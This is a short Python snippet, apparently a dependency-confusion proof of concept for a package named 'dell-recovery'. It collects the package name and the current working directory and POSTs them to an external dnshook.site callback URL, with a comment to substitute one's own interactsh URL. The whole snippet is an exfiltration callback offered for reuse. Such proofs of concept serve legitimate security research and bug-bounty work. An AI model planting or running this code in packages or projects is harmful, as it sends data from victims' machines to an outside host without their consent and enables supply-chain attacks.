import requests, os

data = {
    "package": "dell-recovery",
    "cwd": os.getcwd(),
}

# Replace with your interactsh URL
requests.post("https://43abc148-fc69-4956-accf-acef8a4f71b3.dnshook.site", json=data)